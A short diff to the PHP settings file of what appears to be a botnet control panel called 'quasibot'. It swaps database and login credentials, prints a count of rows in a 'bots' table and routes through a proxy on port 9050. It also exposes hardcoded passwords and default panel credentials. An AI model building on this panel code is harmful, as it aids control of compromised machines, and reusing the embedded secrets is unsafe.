@@ -21,12 +21,12 @@ define('PROXY_PORT', '9050');
 // SQL Connection
 define('SQL_HOST', 'localhost');
 define('SQL_USER', 'root');
-define('SQL_PWD', 'He98MNYcMT674BcR');
+define('SQL_PWD', 'fuckyou');
 define('SQL_DB', 'quasibot');
 
 //Authentication, default credentials - quasi:changeme
 define('AUTH_ENABLE', 1); //0 - Disable, 1 - Enable
-define('AUTH_USER', 'admin'); //Auth login
+define('AUTH_USER', 'quasi'); //Auth login
 define('AUTH_PASS', '4cb9c8a8048fd02294477fcb1a41191a'); //Auth password, MD5 encrypted
 define('AUTH_USECOOKIE', 0); //0 - Disable, 1 - Enable; Cookie Auth Protection
 define('AUTH_COOKIE', 'secretcookie=value'); //Cookie required for Cookie Auth
@@ -175,8 +175,7 @@ mysqli_close($conn);
 function checkbots() {
 
 echo 'Count - ';
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysqli_select_db($conn, SQL_DB);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
 $rows = mysqli_query($conn,'SELECT * FROM `bots`');
 echo mysqli_num_rows($rows);
 echo ' &nbsp;&bull;&nbsp; Current hash - '.md5("#666#".date("h:d")).' &nbsp;&bull;&nbsp; Proxy - '. PROXY_IP.':'.PROXY_PORT.'</a></p></p>';
